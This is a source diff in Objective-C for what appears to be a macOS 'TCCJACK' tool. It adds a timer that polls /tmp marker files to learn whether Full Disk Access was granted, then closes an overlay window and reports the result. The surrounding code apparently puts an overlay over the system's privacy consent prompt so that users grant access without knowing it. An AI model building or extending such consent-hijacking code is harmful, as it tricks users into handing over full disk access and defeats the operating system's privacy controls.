@@ -438,6 +438,18 @@ typedef CGImageRef (*CGDisplayCreateImageFuncPtr)(CGDirectDisplayID displayID);
         [okButton setFrame:NSMakeRect(154, 36, 110, 30)];
         [contentView addSubview:okButton];
         
+        // Set up a timer to check for TCC response
+        NSTimer *checkTimer = [NSTimer scheduledTimerWithTimeInterval:0.1 // Check every 100ms
+                                                             target:self
+                                                           selector:@selector(checkTCCResponse:)
+                                                           userInfo:nil
+                                                            repeats:YES];
+        
+        // Store timer as associated object so it's retained
+        objc_setAssociatedObject(self, "tcc_check_timer", checkTimer, OBJC_ASSOCIATION_RETAIN);
+        
+        TCCJACK_LOG(@"Set up TCC response check timer: %@", checkTimer);
+        
         // Show the window
         TCCJACK_LOG(@"Making window key and ordering front");
         [_overlayWindow makeKeyAndOrderFront:nil];
@@ -445,6 +457,73 @@ typedef CGImageRef (*CGDisplayCreateImageFuncPtr)(CGDirectDisplayID displayID);
     } @catch (NSException *exception) {
         TCCJACK_LOG(@"ERROR: Exception during window creation: %@", exception);
     }
+}
+
+- (void)checkTCCResponse:(NSTimer *)timer {
+    // Run everything on the main thread to avoid synchronization issues
+    dispatch_async(dispatch_get_main_queue(), ^{
+        TCCJACK_LOG(@"Checking TCC response on main thread: %@", [NSThread currentThread]);
+        
+        NSFileManager *fileManager = [NSFileManager defaultManager];
+        BOOL success = [fileManager fileExistsAtPath:@"/tmp/tccjack_success"];
+        BOOL failure = [fileManager fileExistsAtPath:@"/tmp/tccjack_failure"];
+        
+        if (success || failure) {
+            TCCJACK_LOG(@"TCC response detected - Success: %d, Failure: %d", success, failure);
+            
+            // Invalidate and clear timer first
+            if ([timer isValid]) {
+                TCCJACK_LOG(@"Invalidating timer: %@", timer);
+                [timer invalidate];
+            }
+            objc_setAssociatedObject(self, "tcc_check_timer", nil, OBJC_ASSOCIATION_RETAIN);
+            
+            // Clean up marker files
+            [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
+            [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
+            TCCJACK_LOG(@"Cleaned up marker files");
+            
+            // Create result dictionary
+            NSMutableDictionary *result = [[NSMutableDictionary alloc] init];
+            [result setObject:@"tccjack_response" forKey:@"type"];
+            [result setObject:(success ? @"success" : @"failed") forKey:@"status"];
+            [result setObject:(success ? @"Full Disk Access was granted" : @"Full Disk Access was denied") forKey:@"message"];
+            TCCJACK_LOG(@"Created result dictionary: %@", result);
+            
+            // Get and clear completion block
+            void (^savedCompletion)(BOOL, NSDictionary*, NSError*) = objc_getAssociatedObject(self, "completion_block");
+            objc_setAssociatedObject(self, "completion_block", nil, OBJC_ASSOCIATION_COPY);
+            TCCJACK_LOG(@"Retrieved and cleared completion block: %p", savedCompletion);
+            
+            // Clean up window first
+            if (_overlayWindow) {
+                TCCJACK_LOG(@"Starting window cleanup. Current window: %@", _overlayWindow);
+                NSWindow *windowToClose = _overlayWindow;
+                _overlayWindow = nil;
+                [windowToClose close];
+                [windowToClose release];
+                TCCJACK_LOG(@"Window cleanup complete");
+            }
+            
+            // Set flag after window cleanup
+            _tccPromptTriggered = YES;
+            TCCJACK_LOG(@"Set tccPromptTriggered to YES");
+            
+            // Call completion last, after all cleanup is done
+            if (savedCompletion) {
+                TCCJACK_LOG(@"Calling completion block with result");
+                @try {
+                    savedCompletion(YES, result, nil);
+                    TCCJACK_LOG(@"Completion block called successfully");
+                } @catch (NSException *exception) {
+                    TCCJACK_LOG(@"ERROR: Exception during completion block execution: %@", exception);
+                }
+            }
+            
+            [result release];
+            TCCJACK_LOG(@"Cleanup complete");
+        }
+    });
 }
 
 - (void)ensureApplicationSetup {
